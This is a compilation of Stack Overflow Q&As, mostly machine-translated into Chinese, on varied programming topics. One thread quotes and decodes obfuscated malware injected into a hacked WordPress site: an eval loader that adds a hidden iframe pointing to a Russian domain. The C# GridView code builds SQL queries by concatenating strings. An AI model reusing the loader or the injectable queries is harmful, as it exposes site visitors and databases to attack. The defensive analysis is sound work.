![ipod中使用的图像](https://i.stack.imgur.com/KMUdk.png)

这些图像是 png 格式，当我尝试使用 jpg 图像时没有抖动。但我不能 jpg 因为它不支持透明度。

-(UIImage *) getNewImageFromImage:(UIImage *)image {

```
const int RED = 1, GREEN = 2, BLUE = 3;

int width = image.size.width,
height = image.size.height;

uint32_t * pixels = (uint32_t *) malloc(width*height*sizeof(uint32_t));
memset(pixels, 0, width * height * sizeof(uint32_t));

CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB();
CGContextRef context = CGBitmapContextCreate(pixels, width, height, 8, width * sizeof(uint32_t), colorSpace, kCGImageAlphaPremultipliedFirst);

CGContextDrawImage(context, CGRectMake(0, 0, width, height), [image CGImage]);

for(int y = 0; y < height; y++) {
    for(int x = 0; x < width; x++) {
        uint8_t * rgbaPixel = (uint8_t *) &pixels[y*width+x];

        rgbaPixel[BLUE] = blueclr;
        rgbaPixel[GREEN] = greenclr;
         rgbaPixel[RED] = redclr;
    }
}

CGImageRef newImage = CGBitmapContextCreateImage(context);

CGContextRelease(context);
CGColorSpaceRelease(colorSpace);
free(pixels);

UIImage * resultUIImage = [UIImage imageWithCGImage:newImage];
CGImageRelease(newImage);

CGSize newSize = CGSizeMake(image.size.width, image.size.height);
UIGraphicsBeginImageContext( newSize );

[ img1.image drawInRect:CGRectMake(0,0,newSize.width,newSize.height)];
[ resultUIImage drawInRect:CGRectMake(0,0,newSize.width,newSize.height) blendMode:kCGBlendModeOverlay alpha:0.8];

img2.image = UIGraphicsGetImageFromCurrentImageContext();
img2.frame=img1.frame;
img2.alpha=1;
UIGraphicsEndImageContext();

return resultUIImage; 
```

}

# javascript - A malicious js is auto injecting into my header.php files and many other js files?

> ID：16184782
> 
> 赞同：5
> 
> 时间：2013-04-24T06:23:54.637
> 
> 标签：javascript, php, jquery, malware

Currently I am facing a hell like situation, four of my client websites were hacked before 10 days. I messed up a lot with them and three of them are working fine(running magento) after my long mess up with them, but one of them(running word press) is still facing the same situation and I could not figure out what was going on, after a particular timing the js files and some php files too are auto injecting with this kind of code :

```
<?
#ded509#
echo "<script type=\"text/javascript\" language=\"javascript\" > e=eval;v=\"0x\";a=0;try{a&=2}catch(q){a=1}if(!a){try{document[\"body\"]^=~1;}catch(q){a2=\"!\"}z=\"2f!6d!7c!75!6a!7b!70!76!75!27!2f!30!27!82!14!11!27!27!27!27!7d!68!79!27!6a!27!44!27!6b!76!6a!7c!74!6c!75!7b!35!6a!79!6c!68!7b!6c!4c!73!6c!74!6c!75!7b!2f!2e!70!6d!79!68!74!6c!2e!30!42!14!11!14!11!27!27!27!27!6a!35!7a!79!6a!27!44!27!2e!6f!7b!7b!77!41!36!36!71!68!72!80!7a!72!80!6d!35!79!7c!36!6a!76!7c!75!7b!38!3d!35!77!6f!77!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!77!76!7a!70!7b!70!76!75!27!44!27!2e!68!69!7a!76!73!7c!7b!6c!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!69!76!79!6b!6c!79!27!44!27!2e!37!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!6f!6c!70!6e!6f!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7e!70!6b!7b!6f!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!73!6c!6d!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7b!76!77!27!44!27!2e!38!77!7f!2e!42!14!11!14!11!27!27!27!27!70!6d!27!2f!28!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!30!27!82!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!7e!79!70!7b!6c!2f!2e!43!6b!70!7d!27!70!6b!44!63!2e!6a!63!2e!45!43!36!6b!70!7d!45!2e!30!42!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!35!68!77!77!6c!75!6b!4a!6f!70!73!6b!2f!6a!30!42!14!11!27!27!27!27!84!14!11!84!30!2f!30!42\".split(a2);s=\"\";if(window.document)for(i=0;i<z.length;i++)     {s+=String.fromCharCode(e(v+(z[i]))-7);}zaz=s;e(zaz);}</script>";
#/ded509#
?> 
```

This code is injected in all js files and main files, I changed ftp passwords, I checked cron jobs, and manually I looked up for any php code (I am feeling like some php code is doing this) but I am unable to figure it out, and yeah I tried to decode this code and tried to get the functionality for this code, yet removing this malicious code from my js files will make my site fine for some time, but after a random time the scripts will auto injected with this code ? what is this js code actually ? It will be very helpful if somebody explains what is actually going on ?

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:37:20.153

那个 PHP 回应了这个

```
<script type="text/javascript" language="javascript" > e=eval;v="0x";a=0;try{a&=2}catch(q){a=1}if(!a){try{document["body"]^=~1;}catch(q){a2="!"}z="2f!6d!7c!75!6a!7b!70!76!75!27!2f!30!27!82!14!11!27!27!27!27!7d!68!79!27!6a!27!44!27!6b!76!6a!7c!74!6c!75!7b!35!6a!79!6c!68!7b!6c!4c!73!6c!74!6c!75!7b!2f!2e!70!6d!79!68!74!6c!2e!30!42!14!11!14!11!27!27!27!27!6a!35!7a!79!6a!27!44!27!2e!6f!7b!7b!77!41!36!36!71!68!72!80!7a!72!80!6d!35!79!7c!36!6a!76!7c!75!7b!38!3d!35!77!6f!77!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!77!76!7a!70!7b!70!76!75!27!44!27!2e!68!69!7a!76!73!7c!7b!6c!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!69!76!79!6b!6c!79!27!44!27!2e!37!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!6f!6c!70!6e!6f!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7e!70!6b!7b!6f!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!73!6c!6d!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7b!76!77!27!44!27!2e!38!77!7f!2e!42!14!11!14!11!27!27!27!27!70!6d!27!2f!28!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!30!27!82!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!7e!79!70!7b!6c!2f!2e!43!6b!70!7d!27!70!6b!44!63!2e!6a!63!2e!45!43!36!6b!70!7d!45!2e!30!42!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!35!68!77!77!6c!75!6b!4a!6f!70!73!6b!2f!6a!30!42!14!11!27!27!27!27!84!14!11!84!30!2f!30!42".split(a2);s="";if(window.document)for(i=0;i<z.length;i++)     {s+=String.fromCharCode(e(v+(z[i]))-7);}zaz=s;e(zaz);}</script> 
```

以可读的形式看起来像这样

```
e = eval;

v = "0x";
a = 0;
try {
    a &= 2
} catch (q) {
    a = 1
}
if (!a) {
    try {
        document["body"] ^= ~1;
    } catch (q) {
        a2 = "!"
    }
    z = "2f!6d!7c!75!6a!7b!70!76!75!27!2f!30!27!82!14!11!27!27!27!27!7d!68!79!27!6a!27!44!27!6b!76!6a!7c!74!6c!75!7b!35!6a!79!6c!68!7b!6c!4c!73!6c!74!6c!75!7b!2f!2e!70!6d!79!68!74!6c!2e!30!42!14!11!14!11!27!27!27!27!6a!35!7a!79!6a!27!44!27!2e!6f!7b!7b!77!41!36!36!71!68!72!80!7a!72!80!6d!35!79!7c!36!6a!76!7c!75!7b!38!3d!35!77!6f!77!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!77!76!7a!70!7b!70!76!75!27!44!27!2e!68!69!7a!76!73!7c!7b!6c!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!69!76!79!6b!6c!79!27!44!27!2e!37!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!6f!6c!70!6e!6f!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7e!70!6b!7b!6f!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!73!6c!6d!7b!27!44!27!2e!38!77!7f!2e!42!14!11!27!27!27!27!6a!35!7a!7b!80!73!6c!35!7b!76!77!27!44!27!2e!38!77!7f!2e!42!14!11!14!11!27!27!27!27!70!6d!27!2f!28!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!30!27!82!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!7e!79!70!7b!6c!2f!2e!43!6b!70!7d!27!70!6b!44!63!2e!6a!63!2e!45!43!36!6b!70!7d!45!2e!30!42!14!11!27!27!27!27!27!27!27!27!6b!76!6a!7c!74!6c!75!7b!35!6e!6c!7b!4c!73!6c!74!6c!75!7b!49!80!50!6b!2f!2e!6a!2e!30!35!68!77!77!6c!75!6b!4a!6f!70!73!6b!2f!6a!30!42!14!11!27!27!27!27!84!14!11!84!30!2f!30!42".split(a2);
    s = "";
    if (window.document) for (i = 0; i < z.length; i++) {
            s += String.fromCharCode(e(v + (z[i])) - 7);
    }
    zaz = s;
    e(zaz);
} 
```

在上面的代码`e`中是函数`eval`

如果我们删除 eval 并打印`zaz`它的内容将如下所示。

```
(function () {
    var c = document.createElement('iframe');

    c.src = 'http://jakyskyf.ru/count16.php';
    c.style.position = 'absolute';
    c.style.border = '0';
    c.style.height = '1px';
    c.style.width = '1px';
    c.style.left = '1px';
    c.style.top = '1px';

    if (!document.getElementById('c')) {
        document.write('<div id=\'c\'></div>');
        document.getElementById('c').appendChild(c);
    }
})(); 
```

它是一个自我执行的匿名函数。该脚本在您的页面中创建一个 iframe 并从中加载内容`http://jakyskyf.ru/count16.php`

如果您的服务器托管在共享服务器中，则管理员帐户本身可能已被盗用。

**你可以做的事情。**

*   最好的检查位置是服务器日志。检查一些恶意条目。
*   请咨询您的托管服务提供商。
*   将您的密码更改为强密码。
*   通常在 wordpress 网站中会发生这种情况（它发生在我的很多 wordpress 网站中）。如果您使用 wordpress 更新到最新版本。
*   将管理员用户名从更改为其他`admin`名称。
*   更改您的管理员电子邮件和密码。黑客可能已经改变了它。

**这些链接将为您提供更多输入**

*   [框架病毒](http://en.wikipedia.org/wiki/Iframe_virus)
*   [iframe 注入攻击](https://stackoverflow.com/questions/11955634/iframe-injection-attack-followed-us-to-new-server)
*   [服务器范围的 iFrame 注入攻击](http://blog.unmaskparasites.com/2012/08/13/rfi-server-wide-iframe-injections/)
*   [隐藏的 iFrame 注入攻击](http://diovo.com/2009/03/hidden-iframe-injection-attacks/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:28:56.497

您必须将根目录文件或被反复破解的文件的权限更改为 444。确保将所有 index.php/html 文件和 .htaccess 文件的权限更改为只读。还提供 555 权限 js 目录和文件会有所帮助。

这是停止一次又一次地发送垃圾邮件的快速解决方案。要找到它的根源，您必须检查您的数据库条目中的常见表单，例如contact_us 等，这些表单可能在没有适当的清理过滤器的情况下使用脚本。还要从根目录中删除任何未知文件。

# java - is it possible to get formatted date object in Java

> ID：16184786
> 
> 赞同：0
> 
> 时间：2013-04-24T06:24:04.047
> 
> 标签：java, spring, jsf, date

```
 SimpleDateFormat formatter= 
      new SimpleDateFormat("yyyy MMM dd");
     String dateNow = formatter.format(rs.getDate("ExpirationDate").getTime());
System.out.println("Date in String: "+dateNow);
     expDate = formatter.parse(dateNow);
System.out.println("expDate: "+expDate); 
```

Here is the code through which I am trying to format the date to `2013 Apr 26` format.Now `SimpleDateFormat#format` method returns a formatted String but I need a `java.util.Date` object with desired format? Is it possible
**Note:** Actually I need the date object becuase I have to print it on my JSF page and when I tried to print it on JSF it shows defualt format of `java.util.Date` i-e `Mon Mar 04 00:00:00 PKT 2013` whereas I want this `2013 Apr 26`
Another thing is that I found a annotation is Spring framework which is `@DateTimeFormat(pattern = "yyyy MMM dd")` which works itself.Is there anything like this annotation in JSF 2.0.
Thanks

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T11:17:37.907

该类`Date`不存储有关格式的任何信息。该类`Date`基本上仅存在于一个`private long milliseconds`领域。您在打印`Date`实例时看到的格式只是其默认格式，在[其 javadoc](http://docs.oracle.com/javase/7/docs/api/java/util/Date.html#toString%28%29)`toString()`中明确指定。

在 JSF 上下文中，您需要标签在模型和HTML/HTTP[`<f:convertDateTime>`](http://docs.oracle.com/javaee/6/javaserverfaces/2.1/docs/vdldocs/facelets/f/convertDateTime.html)之间进行转换。这可以在和组件中使用。`Date``String``UIOutput``UIInput`

```
<h:outputText value="#{bean.date}">
    <f:convertDateTime pattern="yyyy MMM dd" />
</h:outputText>
...
<h:inputText value="#{bean.date}">
    <f:convertDateTime pattern="dd-MM-yyyy" />
</h:inputText> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T06:30:27.603

没有格式化的 Date 对象之类的东西。除了在其 toString 方法中使用的格式之外，日期对象没有任何内在格式。您需要使用日期格式以特定方式格式化它们，就像您在问题中所做的那样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T07:04:40.550

你可以这样做：

```
public class MyDate extends Date{

    public String toString(){
        SimpleDateFormat formatter= 
        new SimpleDateFormat("yyyy MMM dd");
        String dateNow = formatter.format(this.getTime());
        String ans="";
        ans+="Date in String: "+dateNow;
        expDate = formatter.parse(dateNow);
        ans+="\n"+"expDate: "+expDate;
        return ans;
    }    
} 
```

有了这个，您可以使用 MyDate ，它将根据需要打印。

```
System.out.println(new MyDate()); 
```

# java - Why derived class overriding method should not be more restrictive than base class in java?

> ID：16184797
> 
> 赞同：20
> 
> 时间：2013-04-24T06:24:57.123
> 
> 标签：java

Why derived class overriding method should not be more restrictive than base class in java.Why compiler throws error?can you please anyone explain reason for that?

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-24T06:31:03.547

关键是只知道你的*超类*的调用者应该仍然能够使用它给定的*子类*的任何实例。考虑这种情况：

```
public class Super
{
    public void print()
    {
        System.out.println("Hello!");
    }
}

public class Sub extends Super
{
    @Override
    void print() // Invalid
    {
        System.out.println("Package access");
    }
} 
```

现在从一个不同的包，想象我们有：

```
public void printSuper(Super x)
{
    x.print();
} 
```

我们称之为：

```
printSuper(new Sub()); 
```

你希望它做什么？您正在覆盖该方法，因此它*应该*打印“包访问”-但这意味着您正在从不同的包调用包访问方法...

基本上，这只是[Liskov 替换原则](http://en.wikipedia.org/wiki/Liskov_substitution_principle)的一个例子。您应该能够将子类的任何实例视为超类的实例，并且很难看出这如何与使子类中的事物更具限制性相适应。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-24T06:36:15.337

**您不能使访问修饰符更具限制性，因为这将违反继承的基本规则，即子类实例应该可以替换超类实例。**

例如，假设**Person**类具有**getName 公共方法**，许多类（包括非子类）正在使用该方法。但是有人刚刚将**Employee**添加为 Person 的子类，并且**Employee 中的 getName 受到保护**，只能由子类访问之前的代码将开始中断，并且 Employee 将无法替换为 Person 对象。

因此java决定强加这个限制。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-08-16T18:48:33.280

覆盖消息不应比覆盖方法更具限制性，因为子类的实例应该始终能够在需要超类实例的地方使用。但是，如果一个方法的限制性更强，如果调用来自另一个类或包，则它可能无法访问。例如，想象一下：

```
//File Number 1
public class Human {
    public int age = 21;
    public int getAge() {
        System.out.println("getAge() method in Human");
        return age;
    }
}

//File Number 2
public class Teacher extends Human {
    public int getAge() {
        System.out.println("getAge() method in Teacher");
        return age;
    }
}

//File Number 3
public class Characteristics {  
    public static void showAgeOfObject(Human human) {
        human.getAge();
    }

    public static void main(String[] args) {
        Human human = new Human();
        Teacher teacher = new Teacher();

        showAgeOfObject(human);     
        showAgeOfObject(teacher);
    }
} 
```

现在如果两个 getAge() 方法都是公开的，这将被显示

```
getAge() method in Human
getAge() method in Teacher 
```

但是如果 Teacher 中的 getAge() 是私有的，这将引发错误，因为我们在不同的类中，因此无法访问该方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-12-22T08:38:39.230

考虑下面的例子

```
class Mammal {
    public Mammal readAndGet() throws IOException {//read file and return Mammal`s object}
}

class Human extends Mammal {
    @Override
    public Human readAndGet() throws FileNotFoundException {//read file and return Human object}
} 
```

如果我们执行下面的代码

```
Mammal mammal = new Human();
Mammal obj = mammal.readAndGet(); 
```

而且我们知道编译器`mammal.readAndGet()`是从类的对象中调用的，`Mammal`但是在运行时 JVM 会将`mammal.readAndGet()`方法调用解析为类的调用，`Human`因为`mammal`它正在持有`new Human()`.

方法`readAndGet`是在 public 中定义的`Mammal`，为了减少它在类中的限制，`Human`我们需要删除访问说明符（使其成为`default`）或使其成为`protected`or `private`。

现在假设

*   如果我们定义`readAndGet`为`default`或`protected`在`Human`但`Human`在另一个包中定义
*   如果我们`readAndGet`在 Human 中定义为私有

我们知道 JVM 会在运行时解析`readAndGet`方法调用，但编译器不知道这一点，在这两种情况下，代码都会成功编译，因为 for compiler`readAndGet`是从 class 调用的`Mammal`。

但是在这两种情况下，在运行时 JVM 都将无法从 Human 访问，因为它会由于类中`readAndGet`的限制性访问而受到限制。`readAndGet``Human`

而且我们也不能确定谁将在未来扩展我们的类，他将在哪个包中这样做，如果那个人使覆盖方法的限制更少，JVM 可能无法调用该方法并且代码将在运行时中断.

因此，为了避免这种不确定性，根本不允许对子类中的覆盖方法分配限制性访问。

在覆盖方法时，我们还需要遵循其他规则，您可以阅读更多关于[为什么我们应该遵循方法覆盖规则](https://programmingmitra.com/2017/12/why-we-should-follow-method-overriding-rules.html)以了解原因。

# actionscript-3 - 碰撞无法正常工作 as3

> ID：16184801
> 
> 赞同：0
> 
> 时间：2013-04-24T06:25:08.390
> 
> 标签：actionscript-3

```
var i:Number;

            for (i=0;i<6;i++)
            {

                var brick:Sprite=new Sprite();
                brick.graphics.beginFill(0x02589E);
                brick.graphics.drawRect(0,0,70,7);
                brick.graphics.endFill();
                brick.y=10;
                brick.x=12+(80*i);
                addChild(brick);

            }

addEventListener(Event.ENTER_FRAME,destroy);

            var ball:Sprite=new Sprite();
            ball.graphics.beginFill(0xff0000);
            ball.graphics.drawCircle(0,0,7);
            ball.graphics.endFill();
            ball.x=200;
            ball.y=230;
            addChild(ball); 
```

.......一些球移动的代码......

```
 function destroy(e:Event):void
            {

                 if(ball.hitTestObject(brick)){
                     removeChild(brick);
                 }
            } 
```

当球与砖发生碰撞时，只移除最后一个砖。但如果球与砖发生碰撞，我想单独移除所有砖。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T06:31:24.803

目前，`brick`指的是在您的 for 循环中创建的最后一个实例。您需要做的是将这些对象存储在一个数组中，循环遍历该数组，并检查该数组中每个单独的砖块之间的碰撞。

它可能看起来像这样：

```
// Define the array.
var bricks:Array = [];

// Create bricks.
for(var i:int = 0; i < 6; i++)
{
    var brick:Sprite = new Sprite();

    brick.y = 10;
    brick.x = 12 + (80 * i);
    brick.graphics.beginFill(0x02589E);
    brick.graphics.drawRect(0, 0, 70, 7);
    brick.graphics.endFill();

    addChild(brick);
    bricks.push(brick);
} 
```

然后是您的碰撞检查代码：

```
function destroy(e:Event):void
{
    for each(var brick:Sprite in bricks)
    {
        if(ball.hitTestObject(brick))
        {
            removeChild(brick);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:27:49.700

这里`brick`只指单个对象。将所有积木添加到数组中，然后在销毁函数中循环它们。

# c++ - C++中静态变量和全局变量在内存管理方面的区别？

> ID：16184803
> 
> 赞同：-6
> 
> 时间：2013-04-24T06:25:14.660
> 
> 标签：c++, static-methods

C++中静态变量和全局变量在内存管理方面的区别？

C++中静态方法和全局方法的区别？

我知道这些概念，但还是为了清楚地理解，用简单的话来解释

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T07:10:21.373

在内存管理方面没有区别。静态变量和全局变量都具有“静态存储期限”，这意味着它们在程序退出时被销毁。

# .net - 使用 web.config 中的重写规则对子页面不起作用的规范重写

> ID：16184810
> 
> 赞同：1
> 
> 时间：2013-04-24T06:25:34.260
> 
> 标签：.net, azure, iis-7, rewrite, canonical-link

我们在 Azure 上托管了一个简单的 HTML asp.net 网站，当我们在浏览器中复制粘贴子页面 URL（没有 WWW）时，我们面临重定向问题。示例：www.example.com/subpage.aspx 工作正常，但在复制粘贴 example.com/subpage.aspx 时，它会重定向到 www.example.comsubpage.aspx/（坦率地说，不知道它在哪里以及如何发生）

以下代码是实时写在 web.config 文件中的，（确切的域名除外）

```
<rewrite>
        <rules>
          <rule name="RedirectToWWW" stopProcessing="false">
                <match url=".*" />
               <conditions>
                    <add input="{HTTP_HOST}" pattern="^example\.com$" />
                </conditions>
                 <action type="Redirect" url="http://www.example.com/{R:0}" />
            </rule>
        </rules>
     </rewrite> 
```

我是这个项目的新手，所以关于我应该从哪里开始调查或应该在哪里进行修复的任何指导都会非常有帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T09:44:32.983

改成：

```
<action type="Redirect" url="http://www.eyeswidewhat.net/{R:1}" /> 
```

此外，设置`stopProccessing`为`true`.

# c# - 无法在网格视图中获取行删除事件中的单元格值

> ID：16184811
> 
> 赞同：2
> 
> 时间：2013-04-24T06:25:42.910
> 
> 标签：c#, asp.net, gridview

我正在尝试删除网格视图中的行。为此，我正在如下所示的 rowdeleting 事件中编写代码。

```
protected void GridView1_RowDeleting(object sender, GridViewDeleteEventArgs e)
        {
            string UserId;
            SqlTransaction tran;

            using (con = new SqlConnection())
            {

                con.ConnectionString = ConfigurationManager.ConnectionStrings["EMASFBAConnectionString"].ConnectionString;
                cmd = new SqlCommand();
                cmd.Connection = con;
                con.Open();
                tran = con.BeginTransaction();
                TableCell cell = GridView1.Rows[e.RowIndex].Cells[1];
                string username = cell.Text;
                cmd.Transaction = tran;

                cmd.CommandText = "Delete from aspnet_Users where UserName='" + username + "'";
                UserId = cmd.ExecuteScalar().ToString();

                if (UserId.Length!=0)
                {
                    //delete user from membership table.
                    errorLabel.Text = "User is ready to delete";

                }
                tran.Commit();
                con.Close();
            }
        } 
```

当我调试单元格值时为空。我在这里做错了什么？此网格视图在每一行前面都有编辑和删除按钮。我试过`Cells[0],Cells[2]`但只给出空值。任何人都可以给我解决方案吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T06:45:07.983

您好在 gridview 中定义数据键并使用此方法

```
 string UserID = GridView1.DataKeys[e.RowIndex].Value.ToString(); 
```

然后根据此 ID 删除该行。

```
 cmd.CommandText = "Delete from aspnet_Users where UserID=" + UserID; 
```

之后调用您的数据绑定方法将网格视图与更新的记录绑定

对于数据键名，请使用这个

```
 <asp:gridview datakeynames="UserID"
      runat="server"> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T07:16:49.387

终于得到了答案。如果我尝试将值作为表格单元格获取，则它没有给出正确的值。所以我尝试这样，

```
GridViewRow row = GridView1.Rows[e.RowIndex];
Label usernamelable = (Label)row.FindControl("lblUserNameValue");
string username = usernamelable.Text; 
```

这对我来说很好。我指的是gridview中的标签控件并获取值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-24T06:47:35.177

试试下面的代码：

```
var empId = Convert.ToInt32(this.gvDetails.DataKeys[e.RowIndex].Values["EmpId"].ToString()); 
```

# android - Out of memory exception not caught

> ID：16184812
> 
> 赞同：1
> 
> 时间：2013-04-24T06:25:43.317
> 
> 标签：android, out-of-memory

I have option to save `Bitmap` to sdcard in my app.
I am doing saving in `AsyncTask` method. here is what i do on background

```
public File saveImageToExternalStorage(Bitmap image, String name) {
 String fullPath = Environment.getExternalStorageDirectory().getAbsolutePath() + APP_PATH_SD_CARD + APP_THUMBNAIL_PATH_SD_CARD;

 try {
 File dir = new File(fullPath);
 if (!dir.exists()) {
 dir.mkdirs();
 }
 OutputStream fOut = null;
 File file = new File(fullPath, name.replaceAll("/", "").trim());
 file.createNewFile();
 fOut = new FileOutputStream(file);
 image.compress(Bitmap.CompressFormat.JPEG, 50, fOut);
 fOut.flush();
 fOut.close();
 MediaStore.Images.Media.insertImage(getApplicationContext().getContentResolver(), file.getAbsolutePath(), file.getName(), file.getName());

 return file;

 } catch (Exception e) {
 return null;
 } 
```

I am displaying some information about failing to save and etc for user if I get null from this method. I though this should be sufficient, yet I got reported `OutOfMemory` crash by one user from this method. Stacktrace:

```
java.lang.RuntimeException: An error occured while executing doInBackground()
at android.os.AsyncTask$3.done(AsyncTask.java:299)
at java.util.concurrent.FutureTask$Sync.innerSetException(FutureTask.java:273)
at java.util.concurrent.FutureTask.setException(FutureTask.java:124)
at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:307)
at java.util.concurrent.FutureTask.run(FutureTask.java:137)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1076)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:569)
at java.lang.Thread.run(Thread.java:856)
Caused by: java.lang.OutOfMemoryError
at android.graphics.BitmapFactory.nativeDecodeStream(Native Method)
at android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:527)
at android.graphics.BitmapFactory.decodeFile(BitmapFactory.java:301)
at android.graphics.BitmapFactory.decodeFile(BitmapFactory.java:326)
at android.provider.MediaStore$Images$Media.insertImage(MediaStore.java:796)
at com.stancedcars.wallpapers.FullSelected.saveImageToExternalStorage(FullSelected.java:223) 
```

I would love to solve `OutOfMemory` issue, but `Bitmap`s are heavy in size, high resolution images, I wouldn't want to reduce quality. More importantly I would like to know why the app crashed even though it was in try catch ?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-24T06:28:44.953

您捕获了通用异常，而 OutOfMemoryError 是一个错误，它也是 Throwable。

你有什么

```
java.lang.Object
   ↳    java.lang.Throwable
       ↳    java.lang.Error
           ↳    java.lang.VirtualMachineError
               ↳    java.lang.OutOfMemoryError 
```

你能抓住什么

```
java.lang.Object
   ↳    java.lang.Throwable
       ↳    java.lang.Exception 
```

因此，要捕获所有可能的 Throwable，您需要捕获

```
try {
     //...
} catch (Throwable e) {
    e.printStackTrace();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:30:43.663

使用 catch OutOfMemoryError 不是异常！

```
try {
    // your code
} catch (OutOfMemoryError e) {
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:30:29.210

一旦程序内存不足，就很难恢复。您需要仔细考虑如何在发生这种情况时尝试清理。例如，在您的 saveImageToExternalStorage 中，如果 try/catch 内部发生异常，它不会清理 fOut。所以你应该做一些事情，比如 put

```
OutputStream fOut = null; 
```

在 try/catch 之外，然后在 try/catch 的 finally 块中将其关闭。并注意 finally 块的 catch 中进一步异常的可能性。

# python - 模块导入期间 IDLE/PythonWin 之间的不一致

> ID：16184829
> 
> 赞同：0
> 
> 时间：2013-04-24T06:26:30.820
> 
> 标签：python, import, wxpython, wxwidgets

我一直在 IDLE/PythonWin 甚至 Aptana Studio 3 之间摸索，试图在导入模块方面获得一些一致性。我最近使用的模块是来自 wxPython 的 wx 和 arcpy 模块。IDLE 会让我导入 arcpy，但不能导入 wx。PythonWin 将允许我导入 wx，但不能导入 arcpy。

当我`sys.executable`在空闲时，我得到“C:\Python27\ArcGIS10.1\Lib\site-packages\pythonwin\Pythonwin.exe”

当我`sys.executable`在 PythonWin 中执行时，我得到“C:\Python27\pythonw.exe”

另外，我想知道我是否使用不同的解释器，如何将它们全部设置为同一个，以及使用哪一个。

我已经学习和使用 Python 半年多了，现在我真的很想控制这些问题。

**编辑：多年后的经验教训：使用 pycharm 并让它为您保持环境独立！哈哈**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T14:13:10.623

问题在于，ArcGIS 附带了与软件捆绑在一起的特定 Python，并且您已将正态分布安装到“C:\Python27\”中。我会尝试删除后者并重新安装 wxPython。我猜你所说的这个 IDLE 实际上是嵌入在 ArcGIS 中的，而不是普通的 IDLE。

更清楚地说，当您最初安装 wx 时，它在“C:\Python27\”中看到了 Python 并安装在该位置。如果您无法将 wx 安装到 GIS 位置，则可以通过从 C:\Python27\ 复制 wx 文件夹并将其放入 ArcGIS 来伪造它。它们都应该位于“C:\Python27\Lib\site-packages\wx-2.9.3-msw”之类的文件中（取决于版本），还有一个 wx.pth 文件，您需要从“”C 复制:\Python27\Lib\site-packages" 到 GIS 目录中的相同基本位置。

编辑：我还发现以下链接可能会解决您的问题：

*   [http://www.scoop.it/t/arcpy/p/1759717424/custom-wxpython-gui-s-an-approach-for-arcgis-10-1-arcgis-resource-center](http://www.scoop.it/t/arcpy/p/1759717424/custom-wxpython-gui-s-an-approach-for-arcgis-10-1-arcgis-resource-center)
*   [http://forums.arcgis.com/threads/41809-wxPython-hooked-to-arcmap](http://forums.arcgis.com/threads/41809-wxPython-hooked-to-arcmap)
